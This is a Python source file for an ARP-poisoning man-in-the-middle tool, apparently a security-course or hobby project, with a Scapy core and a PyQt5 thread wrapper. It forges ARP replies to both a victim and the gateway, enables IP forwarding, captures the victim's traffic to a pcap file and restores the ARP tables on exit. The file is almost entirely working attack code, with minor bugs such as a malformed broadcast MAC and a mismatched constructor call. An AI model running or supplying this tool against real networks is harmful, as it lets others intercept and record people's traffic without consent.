import argparse
from scapy.all import (ARP, Ether, conf, send, sniff, srp, wrpcap)
# from termcolor import cprint
import sys
import time
import os
from Helpers import StoppableThread
from PyQt5 import QtCore


def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
    try:
        resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    except PermissionError as e:
        print(f"ERROR: The program must run with root privileges: {e}")
        exit()
    for _,  r in resp:
        return r[Ether].src
    return None


class Arper(QtCore.QThread):
    output_signal = QtCore.pyqtSignal(str)
    error_signal = QtCore.pyqtSignal(str)
    kill_signal = QtCore.pyqtSignal(bool)
    terminate_signal = QtCore.pyqtSignal(str)

    def __init__(self, parent, victim, gateway, interface, verbose):
        QtCore.QThread.__init__(self, parent)
        self.victim = victim
        self.gateway = gateway
        self.victim = victim
        self.interface = interface
        self.verbose = verbose
        conf.iface = interface
        conf.verb = 0
        self.gatewaymac = None
        self.victimmac = None
        self.terminate_signal.connect(self.on_terminate_signal)
        self.is_terminated = False
        self.poison_thread = StoppableThread(
            target=self.poison)
        self.sniff_thread = StoppableThread(
            target=self.sniffer)

    @QtCore.pyqtSlot(str)
    def on_terminate_signal(self, event: str):
        if event == "terminate":
            self.is_terminated = True
            self.restore()
            self.kill_signal.emit(True)

            self.exit()

    def begin(self):
        try:
            self.output_signal.emit("Verifing Victim")
            self.victimmac = get_mac(self.victim)
            self.output_signal.emit("Victim Verified")
        except:
            os.system("sysctl net.ipv4.ip_forward=0")
            self.error_signal.emit("[!] Couldn't Find Victim MAC Address ")
            self.error_signal.emit("[!] Exiting....")
            # sys.exit(1)
        try:
            self.output_signal.emit("Verifing Gateway")
            self.gatewaymac = get_mac(self.gateway)
            self.output_signal.emit("Gateway Verified")
        except:
            os.system("sudo sysctl net.ipv4.ip_forward=0")
            self.error_signal.emit("[!] Couldn't Find Gateway MAC Address ")
            self.error_signal.emit("[!] Exiting....")
            # sys.exit(1)

        self.output_signal.emit(f'[!] Initialized {self.interface}:')
        self.output_signal.emit(
            f'[!] Gateway ({self.gateway}) is at {self.gatewaymac}.')
        self.output_signal.emit(
            f'[!] Victim ({self.victim}) is at {self.victimmac}.')
        self.output_signal.emit('-'*40)

    def run(self):

        self.begin()

        os.system("sysctl net.ipv4.ip_forward=1")

        self.poison_thread.start()

        self.sniff_thread.start()

        self.sniff_thread.join()
        self.poison_thread.join()

    def poison(self):
        poison_victim = ARP(op=2, psrc=self.gateway,
                            pdst=self.victim, hwdst=self.victimmac)
        self.output_signal.emit(poison_victim.summary())
        self.output_signal.emit('-'*40)

        poison_gateway = ARP(op=2, psrc=self.victim,
                             pdst=self.gateway, hwdst=self.gatewaymac)
        self.output_signal.emit(poison_gateway.summary())
        self.output_signal.emit('-'*40)
        self.output_signal.emit(
            "[!] Beginning the ARP poison.")

        while True:
            if not self.verbose:
                sys.stdout.write('.')
                sys.stdout.flush()

            if self.is_terminated:
                self.restore()
                self.kill_signal.emit(True)
                raise KeyboardInterrupt
            send(poison_victim)
            send(poison_gateway)
            time.sleep(2)

    def print_packet(self, packet):
        self.output_signal.emit(packet.summary())

    def sniffer(self):
        time.sleep(5)
        bpf_filter = "ip host %s" % self.victim
        self.output_signal.emit("[!] Sniffing packets...")
        if self.verbose:
            try:
                packets = sniff(filter=bpf_filter,
                                iface=self.interface, prn=self.print_packet, stop_filter=lambda _: self.is_terminated)
            except Exception as e:
                self.output_signal.emit(e)
        else:
            try:
                packets = sniff(filter=bpf_filter, iface=self.interface,
                                stop_filter=lambda _: self.is_terminated)
            except Exception as e:
                self.output_signal.emit(e)
        wrpcap('mitm.pcap', packets)
        self.output_signal.emit('[!] Got the packets..')

        self.restore()

    def restore(self):
        os.system("sysctl net.ipv4.ip_forward=0")
        self.output_signal.emit('[!] Restoring ARP tables...')
        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)
        self.output_signal.emit('[!] Finished...')
        self.kill_signal.emit(True)

        if self.poison_thread is not None:
            self.poison_thread.stop()
        if self.sniff_thread is not None:
            self.sniff_thread.stop()


if __name__ == '__main__':
    import argparse
    os.system("clear")

    parser = argparse.ArgumentParser(description="MITM ATTACK")
    parser.add_argument(
        "-g", "--gateway", help="Gateway IP for ARP Poisoning attacks", required=True)
    parser.add_argument("-t", "--target", help="Target_IP", required=True)
    parser.add_argument(
        "-i", "--interface", help="Network Interface; default eth0", type=str, default='eth0')
    parser.add_argument("-v", "--verbose", action="count", default=False)
    args = parser.parse_args()
    (victim, gateway, interface, verbose) = (
        args.target, args.gateway, args.interface, args.verbose)
    myarp = Arper(victim, gateway, interface, verbose)
    myarp.run()
